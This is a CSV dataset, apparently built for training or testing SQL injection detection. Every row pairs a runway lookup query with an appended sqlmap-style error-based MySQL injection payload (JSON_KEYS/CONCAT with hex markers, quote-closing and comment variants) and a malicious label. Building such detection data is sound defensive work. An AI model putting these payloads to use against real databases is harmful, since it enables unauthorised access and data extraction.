full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND (('fjFb'='fjFb"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND ((('TNLk'='TNLk"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND 'ZkLv'='ZkLv"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND ('idrx' LIKE 'idrx"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND (('KUbU' LIKE 'KUbU"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND ((('quES' LIKE 'quES"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport%' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND 'ffhT%'='ffhT"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND 'tfFh' LIKE 'tfFh"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND (""wDcl""=""wDcl"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND ((""xpws""=""xpws"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport""))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND (((""aEgs""=""aEgs"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND ""MEXl""=""MEXl"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND (""mLgC"" LIKE ""mLgC"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND ((""Flte"" LIKE ""Flte"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport""))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND (((""LGXQ"" LIKE ""LGXQ"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND ""vZRB"" LIKE ""vZRB"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) OR 'bceR'='CMgN"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') WHERE 8252=8252 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- UhgN"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") WHERE 2537=2537 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- qWsI"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' WHERE 6540=6540 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- nTLB"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" WHERE 4185=4185 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- HwzX"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x644c4b41 WHERE 6065=6065 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))))||'"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x4275496a FROM DUAL WHERE 3174=3174 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))))||'"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'+(SELECT 0x53686d75 WHERE 7415=7415 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))))+'"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x53676574 FROM DUAL WHERE 3966=3966 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))))||"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x6e525352 WHERE 7807=7807 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))))||"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT 0x514c6744 WHERE 3387=3387 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))))+"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) AS pedL WHERE 2314=2314 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- KhZE"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) AS TFid WHERE 1473=1473 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- jkKl"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') AS dcbT WHERE 3252=3252 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- pcYd"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") AS jBlU WHERE 5557=5557 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- FWYm"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport""=""BucksAirport"" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND ""BucksAirport""=""BucksAirport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' IN BOOLEAN MODE) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- iIoV"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND (6742=6742"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND ((3857=3857"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND (((1708=1708"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- ajDO"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))# oMRM"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) WHERE 5049=5049 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- kQer"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport WHERE 5291=5291 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- vdKg"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT WOmF WHERE 3312=3312 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))))+"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AS JQwe WHERE 3170=3170 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- OwQl"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AS QpgO WHERE 9004=9004 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- HagH"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport` WHERE 4416=4416 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- elNN"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport`) WHERE 1056=1056 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8)))-- ECFa"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport`=`BucksAirport` AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))) AND `BucksAirport`=`BucksAirport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport]-(SELECT 0 WHERE 3090=3090 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8881=8881,1))),0x71717a7a71)) USING utf8))))|[BucksAirport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8857=8857,1))),0x71717a7a71)) USING utf8)))-- RuBI"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8857=8857,1))),0x71717a7a71)) USING utf8)))-- DMrN"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8857=8857,1))),0x71717a7a71)) USING utf8)))-- sgBs"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8857=8857,1))),0x71717a7a71)) USING utf8))) AND ('KiVL'='KiVL"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8857=8857,1))),0x71717a7a71)) USING utf8))) AND (('AqXj'='AqXj"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8857=8857,1))),0x71717a7a71)) USING utf8))) AND ((('WWRg'='WWRg"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8857=8857,1))),0x71717a7a71)) USING utf8))) AND 'dtRR'='dtRR"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8857=8857,1))),0x71717a7a71)) USING utf8))) AND ('Ames' LIKE 'Ames"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8857=8857,1))),0x71717a7a71)) USING utf8))) AND (('cqmN' LIKE 'cqmN"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'))) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8857=8857,1))),0x71717a7a71)) USING utf8))) AND ((('jkyj' LIKE 'jkyj"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport%' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8857=8857,1))),0x71717a7a71)) USING utf8))) AND 'krAl%'='krAl"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8857=8857,1))),0x71717a7a71)) USING utf8))) AND 'Nsbw' LIKE 'Nsbw"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a6b7871,(SELECT (ELT(8857=8857,1))),0x71717a7a71)) USING utf8))) AND (""Riyy""=""Riyy"");",1,airport-S12,Unknown,Unknown
